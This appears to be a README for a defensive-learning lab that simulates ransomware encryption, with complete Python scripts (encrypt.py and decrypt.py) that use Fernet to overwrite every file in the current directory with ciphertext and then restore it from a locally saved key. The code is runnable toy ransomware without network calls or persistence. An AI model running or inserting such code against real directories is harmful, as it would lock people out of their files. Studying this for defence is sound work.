# Python File Encryption & Decryption Lab (Security Simulation)

## Overview
This project documents a **controlled ransomware-style encryption simulation** performed in a **local Linux sandbox**. The lab follows a public tutorial walkthrough and focuses on **observing, reproducing, and analyzing** the encryption phase of ransomware using Python and the `cryptography` (Fernet) library. All activity is restricted to a test directory and is intended strictly for **educational and defensive cybersecurity learning**.

## Technologies Used
- **Python 3**
- **cryptography (Fernet)**
- OS file handling (`os`, `pathlib`)
- Command-line interface (CLI)
- Virtual environment best practices

## Key Security Concepts Demonstrated

### 1. Encryption Mechanics
- Uses Fernet for **authenticated encryption**
- Demonstrates confidentiality and integrity protection
- Reinforces why encrypted data is inaccessible without the key

### 2. Key Management Awareness
- Separates key generation from encryption logic
- Highlights risks of key exposure or loss
- Mirrors real-world ransomware dependency on key control

### 3. Controlled Malware Simulation
- Mimics ransomware encryption behavior **without**:
  - Network communication
  - Persistence
  - Privilege escalation
  - Self-propagation
- Operates only on **explicitly defined test directories**

### 4. Defensive Security Perspective
- Helps defenders understand:
  - What files are targeted
  - How quickly data can be encrypted
  - Why backups and detection matter
- Can be used to design detection or recovery exercises

## Example Lab Workflow

### encrypt.py
import os
from cryptography.fernet import Fernet


def find_target_files():
    """Locate files eligible for encryption."""
    excluded_files = {"encrypt.py", "decrypt.py", "thekey.key"}
    targets = []

    for filename in os.listdir():
        if filename in excluded_files:
            continue
        if os.path.isfile(filename):
            targets.append(filename)

    return targets


def generate_key():
    """Generate and store an encryption key."""
    key = Fernet.generate_key()
    with open("thekey.key", "wb") as key_file:
        key_file.write(key)
    return key


def encrypt_files(files, key):
    """Encrypt the contents of target files."""
    fernet = Fernet(key)

    for filename in files:
        with open(filename, "rb") as file:
            plaintext = file.read()

        encrypted_data = fernet.encrypt(plaintext)

        with open(filename, "wb") as file:
            file.write(encrypted_data)


def main():
    files = find_target_files()
    print(f"[+] Target files identified: {files}")

    key = generate_key()
    print("[+] Encryption key generated and saved")

    encrypt_files(files, key)
    print("[+] Files encrypted successfully")


if __name__ == "__main__":
    main()


### decrypt.py

import os
from cryptography.fernet import Fernet


def load_key():
    """Load the encryption key from disk."""
    with open("thekey.key", "rb") as key_file:
        return key_file.read()


def find_encrypted_files():
    """Locate files eligible for decryption."""
    excluded_files = {"encrypt.py", "decrypt.py", "thekey.key"}
    targets = []

    for filename in os.listdir():
        if filename in excluded_files:
            continue
        if os.path.isfile(filename):
            targets.append(filename)

    return targets


def decrypt_files(files, key):
    """Decrypt file contents using the encryption key."""
    fernet = Fernet(key)

    for filename in files:
        with open(filename, "rb") as file:
            encrypted_data = file.read()

        decrypted_data = fernet.decrypt(encrypted_data)

        with open(filename, "wb") as file:
            file.write(decrypted_data)


def main():
    key = load_key()
    files = find_encrypted_files()

    print(f"[+] Files identified for decryption: {files}")

    decrypt_files(files, key)
    print("[+] Files decrypted successfully")


if __name__ == "__main__":
    main()
